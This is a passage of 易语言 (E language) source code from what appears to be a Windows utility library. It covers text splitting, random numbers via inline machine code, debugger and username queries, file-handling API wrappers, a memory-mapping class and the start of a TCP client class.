赋值 (路径, 取空白文本 (长度))
返回 (选择 (不等于 (GetCurrentDirectoryA (长度, 路径), 0), 路径, “”))

.子程序 核心_分割文本, 整数型, 公开, 将指定文本进行分割，返回分割后的一维文本数组下标。本命令为初级命令。
.参数 返回数组, 文本型, 参考 数组, 返回分割后的文本数组，请提供变量
.参数 待分割文本, 文本型, , “待分割文本”，类型为“文本型（text）”。如果参数值是一个长度为零的文本，则返回一个空数组，即没有任何成员的数组。
.参数 用作分割的文本, 文本型, 可空, “用作分割的文本”，类型为“文本型（text）”，可以被省略。参数值用于标识子文本边界。如果被省略，则默认使用半角逗号字符作为分隔符。如果是一个长度为零的文本，则返回的数组仅包含一个成员，即完整的“待分割文本”

.局部变量 lpString, 文本型, , , 
.局部变量 z1, 整数型, , , 
.局部变量 z2, 整数型, , , 

清除数组 (返回数组)
.如果真 (等于 (待分割文本, “”))
    返回 (0)
.如果真结束
.如果真 (是否为空 (用作分割的文本))
    赋值 (用作分割的文本, “,”)
.如果真结束
赋值 (z1, 1)
赋值 (z2, 寻找文本 (待分割文本, 用作分割的文本, , 假))
.判断循环首 (不等于 (z2, -1))
    赋值 (lpString, 取文本中间 (待分割文本, z1, 相减 (z2, z1)))
    加入成员 (返回数组, lpString)
    赋值 (z1, 相加 (z2, 1))
    赋值 (z2, 寻找文本 (待分割文本, 用作分割的文本, z1, 假))
.判断循环尾 ()
加入成员 (返回数组, 取文本右边 (待分割文本, 相加 (相减 (取文本长度 (待分割文本), z1), 1)))
返回 (取数组成员数 (返回数组))

.子程序 核心_取随机数, 整数型, 公开, 返回一个指定范围内的随机数值。在使用本命令取一系列的随机数之前，应该先使用“置随机数种子”命令为随机数生成器初始化一个种子值。本命令为初级命令。
.参数 起始数值, 整数型, 可空, 参数必须大于或等于零。本参数如果被省略，默认为 0。
.参数 结束数值, 整数型, 可空, 参数必须大于或等于零。本参数如果被省略，默认为无限。

置入代码 ({ 81, 82, 15, 49, 105, 192, 253, 67, 3, 0, 5, 195, 158, 38, 0, 193, 232, 16, 37, 255, 127, 0, 0, 139, 77, 16, 133, 201, 117, 5, 185, 255, 255, 255, 127, 43, 77, 8, 65, 51, 210, 247, 241, 3, 85, 8, 139, 194, 90, 89, 139, 229, 93, 194, 16, 0 })
返回 (0)

.子程序 核心_取随机文本, 文本型, 公开, 
.参数 文本长度, 整数型, , 
.参数 生成类型, 整数型, , 1、数字 2、字母 3、数字加字母

.局部变量 文本, 文本型, , , 

.计次循环首 (文本长度, )
    .判断开始 (等于 (生成类型, 1))
        赋值 (文本, 相加 (文本, 到文本 (核心_取随机数 (0, 9))))
    .判断 (等于 (生成类型, 2))
        赋值 (文本, 相加 (文本, 字符 (核心_取随机数 (97, 122))))
    .判断 (等于 (生成类型, 3))
        .如果 (等于 (核心_取随机数 (1, 2), 1))
            赋值 (文本, 相加 (文本, 到文本 (核心_取随机数 (0, 9))))
        .否则
            赋值 (文本, 相加 (文本, 字符 (核心_取随机数 (97, 122))))
        .如果结束
        
    .默认
        
    .判断结束
    
.计次循环尾 ()
返回 (文本)

.子程序 核心_取子程序地址, 整数型, , 
.参数 子程序指针, 子程序指针, , 

返回 (SetHandleCount_子程序指针 (子程序指针))

.子程序 核心_是否为调试版, 逻辑型, 公开, IsDebuggerPresent 为真则当前进程正在调试器的描述表中运行否则  当前进程没有在调试器的描述表中运行 IsDebuggerPresent
.局部变量 a, 空白型, , , 
.局部变量 返回, 逻辑型, , , 

赋值 (a, IsDebuggerPresent ())
.如果 (等于 (a, 0))
    赋值 (返回, 假)
.否则
    赋值 (返回, 真)
.如果结束
返回 (返回)

.子程序 系统_取当前用户名扩展, 文本型, 公开, GetUserNameExA Long，TRUE（非零）表示成功，否则返回零 如:PC-200804121120\Administrator
.局部变量 fname, 文本型, , , 
.局部变量 backtrack, 整数型, , , 

赋值 (fname, 取空白文本 (255))
赋值 (backtrack, GetUserNameExA (2, fname, 255))
.如果真 (等于 (backtrack, 0))
    赋值 (fname, “找不到用户名”)
.如果真结束
返回 (fname)


.程序集 文件, , , 

.子程序 文件_移动文件, 逻辑型, 公开, 
.参数 被移动的文件, 文本型, , 
.参数 移动到的位置, 文本型, , 

返回 (MoveFileExA (被移动的文件, 移动到的位置, 2))

.子程序 文件_复制文件, 逻辑型, 公开, 
.参数 被复制的文件名, 文本型, , 
.参数 复制到的文件名, 文本型, , 

返回 (不等于 (CopyFileA (被复制的文件名, 复制到的文件名, 0), 0))

.子程序 文件_删除文件, 逻辑型, 公开, 
.参数 欲删除的文件, 文本型, 可空, 

返回 (不等于 (DeleteFileA (欲删除的文件), 0))

.子程序 文件_取临时文件名, 文本型, 公开, 
.参数 指定目录, 文本型, 可空, 留空为默认为系统临时目录。

.局部变量 长度, 整数型, , , 
.局部变量 路径, 文本型, , , 
.局部变量 文件名, 文本型, , , 

.如果 (是否为空 (指定目录))
    赋值 (长度, GetTempPathA (长度, 路径))
    赋值 (路径, 取空白文本 (300))
    GetTempPathA (长度, 路径)
    赋值 (文件名, 取空白文本 (300))
    GetTempFileNameA (路径, 0, 0, 文件名)
    DeleteFileA (文件名)
.否则
    赋值 (文件名, 取空白文本 (300))
    GetTempFileNameA (指定目录, 0, 0, 文件名)
    DeleteFileA (文件名)
.如果结束
返回 (文件名)

.子程序 文件_更名, 逻辑型, 公开, 
.参数 欲更名的原文件或目录名, 文本型, , 
.参数 欲更改为的现文件或目录名, 文本型, , 

返回 (MoveFileExA (欲更名的原文件或目录名, 欲更改为的现文件或目录名, 0))

.子程序 文件_是否存在, 逻辑型, 公开, 
.参数 欲测试的文件名称, 文本型, , 

.局部变量 句柄, 空白型, , , 

赋值 (句柄, 文件_打开文件 (欲测试的文件名称, , ))
.如果 (等于 (句柄, -1))
    CloseHandle (句柄)
    返回 (假)
.否则
    CloseHandle (句柄)
    返回 (真)
.如果结束


.子程序 文件_取文件尺寸, 整数型, 公开, 失败返回-1。
.参数 文件名, 文本型, , 

.局部变量 大小, 整数型, , , 
.局部变量 句柄, 整数型, , , 

赋值 (句柄, 文件_打开文件 (文件名, , ))
.如果真 (等于 (句柄, -1))
    CloseHandle (句柄)
    返回 (-1)
.如果真结束
赋值 (大小, GetFileSize (句柄, 0))
CloseHandle (句柄)
返回 (选择 (等于 (大小, 429496729), -1, 大小))

.子程序 文件_关闭文件, 逻辑型, 公开, CloseHandle非零表示成功，零表示失败。会设置GetLastError关闭一个内核对象。其中包括文件、文件映射、进程、线程、安全和同步对象等。涉及文件处理时，这个函数通常与vb的close命令相似。应尽可能的使用close，因为它支持vb的差错控制。注意这个函数使用的文件句柄与vb的文件编号是完全不同的  非零表示成功，零表示失败。会设置GetLastError
.参数 欲关闭的文件号, 整数型, , 该文件号由“打开文件”命令所返回。

.局部变量 变量, 整数型, , , 
.局部变量 返回, 逻辑型, , , 

 ' 关闭文件 ()

赋值 (变量, CloseHandle (欲关闭的文件号))
.如果真 (不等于 (变量, 0))
    赋值 (返回, 真)
    
.如果真结束
返回 (返回)


.子程序 文件_读入文件, 字节集, 公开, 
.参数 文件名, 文本型, , 

.局部变量 大小, 整数型, , , 
.局部变量 字节集, 字节集, , , 
.局部变量 句柄, 整数型, , , 
.局部变量 实际读入的字符数, 空白型, , , 

赋值 (句柄, 文件_打开文件 (文件名, , ))
.如果真 (等于 (句柄, -1))
    CloseHandle (句柄)
    返回 ({  })
.如果真结束
赋值 (大小, GetFileSize (句柄, 0))
.如果真 (等于 (大小, 4294967295))
    CloseHandle (句柄)
    返回 ({  })
.如果真结束
赋值 (字节集, 取空白字节集 (大小))
 ' lread (句柄, 字节集, 大小)
ReadFile (句柄, 字节集, 大小, 实际读入的字符数, 0)

CloseHandle (句柄)
返回 (字节集)

.子程序 文件_写到文件, 逻辑型, 公开, 
.参数 文件名, 文本型, , 
.参数 欲写入数据, 字节集, , 

.局部变量 句柄, 整数型, , , 
.局部变量 返回值, 整数型, , , 
.局部变量 实际写入字节数量, 空白型, , , 
.局部变量 返回, 逻辑型, , , 

赋值 (句柄, 文件_打开文件 (文件名, 4, 4))
 ' 句柄 ＝ 文件_打开文件 (核心_取当前目录 () ＋ “\bb.txt”, , )
.如果真 (等于 (句柄, -1))
    CloseHandle (句柄)
    返回 (假)
.如果真结束
 ' 返回值 ＝ lwrite (句柄, 欲写入数据, 字节集_取长度 (欲写入数据))
.如果 (WriteFile (句柄, 欲写入数据, 取字节集长度 (欲写入数据), 实际写入字节数量, 0))
    赋值 (返回, 真)
.否则
    赋值 (返回, 假)
.如果结束
CloseHandle (句柄)
返回 (返回)

.子程序 文件_取文件属性, 整数型, 公开, 与支持库原命令使用方法一样，请参考支持库原命令的说明。
.参数 文件名或目录名, 文本型, , 

返回 (GetFileAttributesA (文件名或目录名))

.子程序 文件_置文件属性, 逻辑型, 公开, 与支持库原命令使用方法一样，请参考支持库原命令的说明。
.参数 文件或目录名, 文本型, , 
.参数 欲设置为的属性值, 整数型, , 

返回 (SetFileAttributesA (文件或目录名, 欲设置为的属性值))

.子程序 文件_置文件时间, 逻辑型, 公开, 成功返回真，失败返回假。
.参数 文件名, 文本型, , 
.参数 新的创建时间, 日期时间型, 可空, 至少选择一项修改。
.参数 新的修改时间, 日期时间型, 可空, 
.参数 新的上次访问时间, 日期时间型, 可空, 

.局部变量 返回值, 逻辑型, , , 
.局部变量 句柄, 整数型, , , 
.局部变量 FileTime, FILETIME, , "3", 
.局部变量 计次, 整数型, , , 

.如果真 (并且 (是否为空 (新的创建时间), 是否为空 (新的修改时间), 是否为空 (新的上次访问时间)))
    CloseHandle (句柄)
    返回 (假)
.如果真结束
赋值 (句柄, 文件_打开文件 (文件名, , ))
.如果真 (等于 (句柄, -1))
    CloseHandle (句柄)
    返回 (假)
.如果真结束
赋值 (FileTime [1], 文件_VariantTimeToFileTime (新的创建时间))
赋值 (FileTime [2], 文件_VariantTimeToFileTime (新的上次访问时间))
赋值 (FileTime [3], 文件_VariantTimeToFileTime (新的修改时间))
.计次循环首 (3, 计次)
    LocalFileTimeToFileTime (FileTime [计次], FileTime [计次])
.计次循环尾 ()
赋值 (返回值, SetFileTime (句柄, FileTime [1], FileTime [2], FileTime [3]))
CloseHandle (句柄)
返回 (返回值)

.子程序 文件_取文件时间, 日期时间型, 公开, 返回文件上一次修改的时间。
.参数 文件名, 文本型, , 
.参数 文件的创建时间, 日期时间型, 参考 可空, 可提供变量接收此文件的该额外信息，不需要可不填。
.参数 文件上次访问时间, 日期时间型, 参考 可空, 可提供变量接收此文件的该额外信息，不需要可不填。

.局部变量 句柄, 整数型, , , 
.局部变量 时间, 日期时间型, , "3", 
.局部变量 FILETIME, FILETIME, , "3", 
.局部变量 计次, 整数型, , , 

连续赋值 (到时间 (“”), 时间 [3], 文件的创建时间, 文件上次访问时间)
 ' 连续赋值 (核心_文本到时间 (“”), 时间 [3], 文件的创建时间, 文件上次访问时间)
赋值 (句柄, 文件_打开文件 (文件名, , ))
.如果真 (不等于 (句柄, -1))
    GetFileTime (句柄, FILETIME [1], FILETIME [2], FILETIME [3])
    CloseHandle (句柄)
    .计次循环首 (3, 计次)
        FileTimeToLocalFileTime (FILETIME [计次], FILETIME [计次])
        赋值 (时间 [计次], 文件_FileTimeToVariantTime (FILETIME [计次]))
    .计次循环尾 ()
    赋值 (文件的创建时间, 时间 [1])
    赋值 (文件上次访问时间, 时间 [2])
.如果真结束
CloseHandle (句柄)
返回 (时间 [3])

.子程序 文件_FileTimeToVariantTime, 日期时间型, , 
.参数 FileTime, FILETIME, , 

.局部变量 系统时间, 系统时间, , , 
.局部变量 时间, 日期时间型, , , 

FileTimeToSystemTime (FileTime, 系统时间)
SystemTimeToVariantTime (系统时间, 时间)
返回 (时间)

.子程序 文件_VariantTimeToFileTime, FILETIME, , 
.参数 时间, 日期时间型, , 

.局部变量 FileTime, FILETIME, , , 
.局部变量 系统时间, 系统时间, , , 

VariantTimeToSystemTime (时间, 系统时间)
SystemTimeToFileTime (系统时间, FileTime)
返回 (FileTime)

.子程序 文件_进度移动, 逻辑型, 公开, 可移动文件，也可移动目录。成功返回真，失败返回假。参考了“美女勿进”的代码。
.参数 被移动的文件或目录, 文本型, , 
.参数 移动到的位置, 文本型, , 
.参数 复制选项, 整数型, 可空, 1.#既不提示错误，也不显示进度；2.#不提示错误，显示进度；3.#不显示进度；4.#既提示错误，又显示进度。如果被省略，默认值为 1 。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 1)
赋值 (类型.pFrom, 相加 (到字节集 (被移动的文件或目录), { 0, 0 }))
赋值 (类型.pTo, 相加 (到字节集 (移动到的位置), { 0, 0 }))
.如果 (并且 (大于 (复制选项, 0), 小于或等于 (复制选项, 4)))
    赋值 (类型.fFlags, 多项选择 (复制选项, 1021, 1024, 4, 0))
.否则
    赋值 (类型.fFlags, 1021)
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 文件_进度复制, 逻辑型, 公开, 可复制文件，也可复制目录。成功返回真，失败返回假。参考了“美女勿进”的代码。
.参数 被复制的文件或目录, 文本型, , 
.参数 复制到的位置, 文本型, , 
.参数 复制选项, 整数型, 可空, 1.#既不提示错误，也不显示进度；2.#不提示错误，显示进度；3.#不显示进度；4.#既提示错误，又显示进度。如果被省略，默认值为 1 。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 2)
赋值 (类型.pFrom, 相加 (到字节集 (被复制的文件或目录), { 0, 0 }))
赋值 (类型.pTo, 相加 (到字节集 (复制到的位置), { 0, 0 }))
.如果 (并且 (大于 (复制选项, 0), 小于或等于 (复制选项, 4)))
    赋值 (类型.fFlags, 多项选择 (复制选项, 1021, 1024, 4, 0))
.否则
    赋值 (类型.fFlags, 1021)
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 文件_进度删除, 逻辑型, 公开, 可删除文件，也可删除目录。成功返回真，失败返回假。
.参数 欲删除的文件或目录, 文本型, , 
.参数 复制选项, 整数型, 可空, 1.#既不提示错误，也不显示进度；2.#不提示错误，显示进度；3.#不显示进度；4.#既提示错误，又显示进度。如果被省略，默认值为 1 。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 3)
赋值 (类型.pFrom, 相加 (到字节集 (欲删除的文件或目录), { 0, 0 }))
.如果 (并且 (大于 (复制选项, 0), 小于或等于 (复制选项, 4)))
    赋值 (类型.fFlags, 多项选择 (复制选项, 55, 1040, 20, 16)) ' , 位或 (16, 1024) ', 位或 (4, 16),
.否则
    赋值 (类型.fFlags, 55)
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 文件_打开文件, 整数型, 公开, 失败返回-1, 如果文件已用同一个类打开将会失败。
.参数 欲打开的文件名称, 文本型, , 
.参数 打开方式, 整数型, 可空, 参数值说明对文件的操作方式，如果省略本参数，默认为“#读写”。方式值可以为以下常量之一： 1、#读入：从指定文件读入数据，如果该文件不存在则失败； 2、#写出：写出数据到指定文件，如果该文件不存在则失败； 3、#读写：从文件中读入数据或者写出数据到文件，如果该文件不存在则失败； 4、#重写：写出数据到指定文件。如果该文件不存在则先创建一个新文件，如果已经存在就先清除其中的所有数据； 5、#改写：写出数据到指定文件。如果该文件不存在则创建一个新文件，如果已经存在就直接打开； 6、#改读：从文件中读入数据或者写出数据到文件。如果该文件不存在则创建一个新文件，如果已经存在就直接打开。
.参数 共享方式, 整数型, 可空, 参数值指定限制其它进程操作此文件的方式。如果省略本参数，默认为“#无限制”。方式值可以为以下常量之一： 1、#无限制：允许其它进程任意读写此文件； 2、#禁止读：禁止其它进程读此文件； 3、#禁止写：禁止其它进程写此文件； 4、#禁止读写：禁止其它进程读写此文件。

.局部变量 打开方式1, 整数型, , , 
.局部变量 共享方式1, 整数型, , , 
.局部变量 打开方式2, 整数型, , , 

.如果真 (是否为空 (打开方式))
    赋值 (打开方式, #读写)
.如果真结束
.如果真 (是否为空 (共享方式))
    赋值 (共享方式, #无限制)
.如果真结束
.判断开始 (等于 (打开方式, #读入)) ' 从指定文件读入数据，如果该文件不存在则失败
    赋值 (打开方式1, #GENERIC_READ) ' #OF_READ
.判断 (等于 (打开方式, #写出)) ' 写出数据到指定文件，如果该文件不存在则失败
    赋值 (打开方式1, #GENERIC_WRITE) ' #OF_WRITE
.判断 (等于 (打开方式, #读写)) ' 从文件中读入数据或者写出数据到文件，如果该文件不存在则失败
    赋值 (打开方式1, 相加 (#GENERIC_READ, #GENERIC_WRITE)) ' #OF_READWRITE
.判断 (等于 (打开方式, #重写)) ' 写出数据到指定文件。如果该文件不存在则先创建一个新文件，如果已经存在就先清除其中的所有数据
    赋值 (打开方式1, 相加 (#GENERIC_READ, #GENERIC_WRITE)) ' #OF_CREATE ＋ #OF_WRITE
.判断 (等于 (打开方式, #改写)) ' 写出数据到指定文件。如果该文件不存在则创建一个新文件，如果已经存在就直接打开
    赋值 (打开方式1, #GENERIC_WRITE) ' #OPEN_ALWAYS
.判断 (等于 (打开方式, #改读)) ' 从文件中读入数据或者写出数据到文件。如果该文件不存在则创建一个新文件，如果已经存在就直接打开
    赋值 (打开方式1, 相加 (#GENERIC_READ, #GENERIC_WRITE)) ' #OPEN_ALWAYS ＋ #OF_READWRITE
.默认
    
.判断结束
.判断开始 (等于 (共享方式, #无限制))
    赋值 (共享方式1, 相加 (#FILE_SHARE_WRITE, #FILE_SHARE_READ))
.判断 (等于 (共享方式, #禁止读))
    赋值 (共享方式1, #FILE_SHARE_WRITE)
.判断 (等于 (共享方式, #禁止写))
    赋值 (共享方式1, #FILE_SHARE_READ)
.判断 (等于 (共享方式, #禁止读写))
    赋值 (共享方式1, 0)
.默认
    
.判断结束

返回 (CreateFile (欲打开的文件名称, 打开方式1, 共享方式1, 0, 选择 (等于 (打开方式, #重写), #CREATE_ALWAYS, 选择 (小于 (打开方式, 4), #OPEN_EXISTING, #OPEN_ALWAYS)), #FILE_ATTRIBUTE_NORMAL, 0))

.子程序 文件_生成空文件, 长整数型, 公开, 生成并打开一个空文件。生成空文件后将会将读写指针置为文件首。如果生成空文件成功，将返回生成新文件的实际尺寸。如果生成新文件失败将返回-1。
.参数 欲生成的文件名称, 文本型, , 
.参数 空文件的尺寸, 整数型, 可空, 默认为0
.参数 共享方式, 整数型, 可空, 参数值指定限制其它进程操作此文件的方式。如果省略本参数，默认为“#无限制”。方式值可以为以下常量之一： 1、#无限制：允许其它进程任意读写此文件； 2、#禁止读：禁止其它进程读此文件； 3、#禁止写：禁止其它进程写此文件； 4、#禁止读写：禁止其它进程读写此文件。

.局部变量 I, 长整数型, , , 
.局部变量 空白字节, 字节集, , , 
.局部变量 是否成功, 整数型, , , 
.局部变量 文件号, 空白型, , , 
.局部变量 文件长度, 空白型, , , 

 ' 参数值说明对文件的操作方式，如果省略本参数，默认为“#读写”。方式值可以为以下常量之一：
.如果真 (小于 (空文件的尺寸, 0))
    返回 (-1)
.如果真结束
.如果真 (是否为空 (共享方式))
    赋值 (共享方式, #无限制)
.如果真结束
赋值 (文件号, 文件_打开文件 (欲生成的文件名称, #重写, 共享方式))
.如果真 (不等于 (文件号, -1))
    .如果 (等于 (空文件的尺寸, 0))
        文件_关闭文件 (文件号)
        返回 (0)
    .否则
        .判断开始 (小于或等于 (空文件的尺寸, 2097152)) ' 2* 1024 × 1024) 2M
            文件_写出字节集 (文件号, 取空白字节集 (空文件的尺寸))
        .默认
            赋值 (空白字节, 取空白字节集 (2097152))
            赋值 (I, 整除 (空文件的尺寸, 2097152))
            .计次循环首 (I, )
                文件_写出字节集 (文件号, 空白字节)
            .计次循环尾 ()
            赋值 (I, 相减 (空文件的尺寸, 相乘 (I, 2097152)))
            .如果真 (不等于 (I, 0))
                文件_写出字节集 (文件号, 取空白字节集 (I))
            .如果真结束
            
        .判断结束
        
    .如果结束
    
.如果真结束
赋值 (文件长度, 文件_取文件长度 (文件号))
 ' 文件_关闭文件 (文件号)
返回 (文件号)

.子程序 文件_移到文件首, 逻辑型, 公开, 
.参数 文件号, 整数型, , 

.如果 (等于 (SetFilePointer (文件号, 0, 0, #FILE_BEGIN), -1))
    返回 (假)
.否则
    返回 (真)
.如果结束


.子程序 文件_移到文件尾, 逻辑型, 公开, 
.参数 文件号, 整数型, , 

.如果 (等于 (SetFilePointer (文件号, 0, 0, #FILE_END), -1))
    返回 (假)
.否则
    返回 (真)
.如果结束


.子程序 文件_移动读写位置, 逻辑型, 公开, 
.参数 文件号, 整数型, , 
.参数 起始移动位置, 整数型, 可空, 参数值指定从文件中开始移动的位置。可以为以下常量之一：1、#文件首； 2、#文件尾； 3、#现行位置。如果本参数被省略，默认值为“#文件首”。
.参数 移动距离, 整数型, , 

 ' 移动读写位置 （整数型 欲进行操作的文件号，［整数型 起始移动位置］，整数型 移动距离）
.如果真 (或者 (是否为空 (起始移动位置), 大于 (起始移动位置, #现行位置), 小于或等于 (起始移动位置, 0)))
    赋值 (起始移动位置, #文件首)
.如果真结束
.判断开始 (等于 (SetFilePointer (文件号, 移动距离, 0, 多项选择 (起始移动位置, #FILE_BEGIN, #FILE_END, #FILE_CURRENT)), -1))
    返回 (假)
.默认
    返回 (真)
.判断结束
 ' FILE_BEGIN lOffset将新位置设为从文件起始处开始算的起的一个偏移
 ' FILE_CURRENT lOffset将新位置设为从当前位置开始计算的一个偏移
 ' FILE_END


.子程序 文件_取读写位置, 整数型, 公开, 
.参数 文件号, 整数型, , 

返回 (SetFilePointer (文件号, 0, 0, #FILE_CURRENT))


.子程序 文件_取文件长度, 长整数型, 公开, 
.参数 文件号, 整数型, , 

.局部变量 高32位文件尺寸, 整数型, , , 
.局部变量 文件长度, 整数型, , , 

赋值 (文件长度, GetFileSize (文件号, 高32位文件尺寸))
返回 (到整数 (相加 (到字节集 (文件长度), 到字节集 (高32位文件尺寸))))


.子程序 文件_写出字节集, 逻辑型, 公开, 写出一段或数段字节集数据到文件中当前读写位置处。如果当前读写位置处有数据，数据将被覆盖。
.参数 文件号, 整数型, , 
.参数 欲写出的字节集数据, 字节集, , 

.局部变量 实际写入字节数量, 整数型, , , 
.局部变量 写入字节数量, 整数型, , , 

赋值 (写入字节数量, 取字节集长度 (欲写出的字节集数据))
.判断开始 (等于 (WriteFile (文件号, 欲写出的字节集数据, 写入字节数量, 实际写入字节数量, 0), 假))
    返回 (假)
.默认
    返回 (取反 (等于 (实际写入字节数量, 0)))
.判断结束


.子程序 文件_是否在文件尾, 逻辑型, 公开, 
.参数 文件号, 整数型, , 

返回 (等于 (文件_取读写位置 (文件号), 文件_取文件长度 (文件号)))

.子程序 文件_取错误信息, 空白型, 公开, 
.参数 错误号, 整数型, 参考 可空, 
.参数 错误文本, 文本型, 参考 可空, 

.局部变量 Bytes, 整数型, , , 

赋值 (错误号, GetLastError ())
.如果真 (不等于 (错误号, 0))
    赋值 (错误文本, 取空白文本 (129))
    赋值 (Bytes, FormatMessageA (位或 (#FORMAT_MESSAGE_FROM_SYSTEM, #FORMAT_MESSAGE_ARGUMENT_ARRAY), 0, 错误号, 0, 错误文本, 128, 0))
    .判断开始 (大于 (Bytes, 2))
        赋值 (错误文本, 取文本左边 (错误文本, 相减 (Bytes, 2)))
    .默认
        赋值 (错误文本, “”)
    .判断结束
    
.如果真结束


.子程序 文件_读入字节集, 字节集, 公开, 
.参数 文件号, 整数型, , 
.参数 欲读入数据的长度, 整数型, 可空, 如果为空则读入 当前读写位置 到 文件尾 之间的全部字节集

.局部变量 缓冲区, 字节集, , , 
.局部变量 实际读入的字符数, 整数型, , , 


.如果真 (或者 (是否为空 (欲读入数据的长度), 等于 (欲读入数据的长度, 0)))
    赋值 (欲读入数据的长度, 相减 (文件_取文件长度 (文件号), 文件_取读写位置 (文件号)))
.如果真结束
赋值 (缓冲区, 取空白字节集 (欲读入数据的长度))
ReadFile (文件号, 缓冲区, 欲读入数据的长度, 实际读入的字符数, 0)
.判断开始 (等于 (欲读入数据的长度, 实际读入的字符数))
    返回 (缓冲区)
.默认
    返回 (取字节集左边 (缓冲区, 实际读入的字符数))
.判断结束


.子程序 文件_读入文本, 文本型, 公开, 从文件中当前读写位置读取并返回一段文本数据，实际读入长度（即返回文本的尺寸）可能会小于欲读入长度。如果该数据中存在字节 0 或 26（文本结束标志），将仅返回该字节之前的数据。
.参数 文件号, 整数型, , 
.参数 欲读入文本数据的长度, 整数型, 可空, 如果本参数被省略，默认读入文件中的所有文本数据。

 ' 〈文本型〉 读入文本 （整数型 欲读入文本数据的文件号，［整数型 欲读入文本数据的长度］）
返回 (到文本 (文件_读入字节集 (文件号, 欲读入文本数据的长度)))


.子程序 文件_写出文本, 逻辑型, 公开, 写出文本数据到文件中当前读写位置处。如果当前读写位置处有数据，数据将被覆盖。成功返回真，失败返回假。
.参数 文件号, 整数型, , 
.参数 欲写出的文本, 文本型, , 

 ' 调用格式： 〈逻辑型〉 写出文本 （整数型 欲写出文本的文件号，通用型 欲写出的文本，... ） - 系统核心支持库->文件读写
 ' 英文名称：WriteText
 ' 本命令用作写出一段或数段文本数据到文件中当前读写位置处。成功返回真，失败返回假。本命令为初级命令。命令参数表中最后一个参数可以被重复添加。
 ' 参数<1>的名称为“欲写出文本的文件号”，类型为“整数型（int）”。该文件号由“打开文件”命令所返回。
 ' 参数<2>的名称为“欲写出的文本”，类型为“通用型（all）”。参数值如果不为文本类型数据，将自动进行转换，如果无法转换（即数据类型为字节集、子程序指针、库或用户自定义数据类型），则不写出此数据。
返回 (文件_写出字节集 (文件号, 到字节集 (欲写出的文本)))


.类模块 内存申请, , , 

.程序集变量 集_句柄, 整数型, , , 
.程序集变量 集_起始地址, 整数型, , , 
.程序集变量 集_当前位置, 长整数型, , , 
.程序集变量 集_文件尺寸, 长整数型, , , 
.子程序 _初始化, 空白型, , 当基于本类的对象被创建后，此方法会被自动调用
取错误代码 ()

.子程序 _销毁, 空白型, , 当基于本类的对象被销毁前，此方法会被自动调用
关闭_销毁 ()

.子程序 申请内存大小, 逻辑型, 公开, 
.参数 申请尺寸, 长整数型, , 

.局部变量 句柄, 整数型, , , 
.局部变量 起始地址, 整数型, , , 

.如果真 (小于或等于 (申请尺寸, 0))
    返回 (假)
.如果真结束
赋值 (句柄, 创建映射 (-1, 0, 4, 取字节集数据 (到字节集 (申请尺寸), #整数型, 5), 取字节集数据 (到字节集 (申请尺寸), #整数型, 1), 0))
.判断开始 (等于 (句柄, 0))
    返回 (假)
.默认
    赋值 (起始地址, 映射装载 (句柄, 2, 0, 0, 0))
    .如果真 (等于 (起始地址, 0))
        关闭对象 (句柄)
        返回 (假)
    .如果真结束
    .如果真 (不等于 (集_句柄, 0))
        .如果真 (等于 (关闭_销毁 (), 假))
            映射卸载 (起始地址)
            关闭对象 (句柄)
            返回 (假)
        .如果真结束
        
    .如果真结束
    赋值 (集_句柄, 句柄)
    赋值 (集_起始地址, 起始地址)
    赋值 (集_文件尺寸, 申请尺寸)
    返回 (真)
.判断结束


.子程序 关闭_销毁, 逻辑型, , 
.如果 (不等于 (映射卸载 (集_起始地址), 0))
    关闭对象 (集_句柄)
    连续赋值 (0, 集_起始地址, 集_句柄, 集_当前位置, 集_文件尺寸)
    返回 (真)
.否则
    返回 (假)
.如果结束



.子程序 取写到位置, 长整数型, 公开, 
.如果真 (等于 (集_起始地址, 0))
    返回 (-1)
.如果真结束
返回 (集_当前位置)


.子程序 读出全部字节集_并关闭, 字节集, 公开, 
.局部变量 Temp, 字节集, , , 

赋值 (Temp, 指针到字节集 (集_起始地址, 集_文件尺寸))
关闭_销毁 ()
返回 (Temp)

.子程序 写入字节集, 逻辑型, 公开, 
.参数 欲写入字节集, 字节集, , 

.如果真 (或者 (大于 (相加 (集_当前位置, 取字节集长度 (欲写入字节集)), 集_文件尺寸), 等于 (集_起始地址, 0)))
    返回 (假)
.如果真结束
写入映射_字节集 (相加 (集_起始地址, 集_当前位置), 欲写入字节集, 取字节集长度 (欲写入字节集))
赋值 (集_当前位置, 相加 (集_当前位置, 取字节集长度 (欲写入字节集)))
返回 (真)

.子程序 取总尺寸, 长整数型, 公开, 如果是用“初始化_从映射对象创建”来初始化类，得到的尺寸会有可能比真实文件尺寸稍大（4096的倍数）
返回 (集_文件尺寸)

.类模块 TCP客户端, , , 最多可建立100000个连接

.程序集变量 index, 整数型, , , 
.子程序 _初始化, 空白型, , 当基于本类的对象被创建后，此方法会被自动调用


.子程序 _销毁, 空白型, , 当基于本类的对象被销毁前，此方法会被自动调用
断开 ()

.子程序 连接, 逻辑型, 公开, 连接到指定的服务器.
.参数 IP地址, 文本型, , 服务器IP地址.
.参数 端口号, 整数型, , 欲连接到的端口号.
.参数 事件回调函数, 子程序指针, , 网络事件回调函数, 该函数必须具有四个整数型参数, 第一个参数为 客户标识 , 第二个参数为 事件类型 ,第三个参数为 数据地址 ,第四个参数为 数据长度.
.参数 客户标识, 整数型, 可空, 多个连接共用一个事件回调函数时用于区分的标识码. 例如将客户数组的索引传进来就可以知道是哪个连接发生的事件.

.如果真 (不等于 (index, 0))
    Disconnect (index)
.如果真结束

赋值 (index, Connect (客户标识, 到整数 (事件回调函数), IP地址, 端口号))

返回 (不等于 (index, 0))

.子程序 断开, 空白型, 公开, 断开已有的连接.
.如果真 (不等于 (index, 0))
    Disconnect (index)
    赋值 (index, 0)
.如果真结束


.子程序 取回数据, 字节集, 公开, 取回接收到的数据.
.参数 数据地址, 整数型, , 事件回调函数的第二个参数.
.参数 数据长度, 整数型, , 事件回调函数的第三个参数.

.局部变量 buf, 字节集, , , 

.如果 (等于 (index, 0))
    返回 ({  })
.否则
    赋值 (buf, 取空白字节集 (数据长度))
    GetData (数据地址, buf, 数据长度)
    返回 (buf)
.如果结束


.子程序 发送数据, 逻辑型, 公开, 将数据发送到服务器.
.参数 数据, 字节集, , 

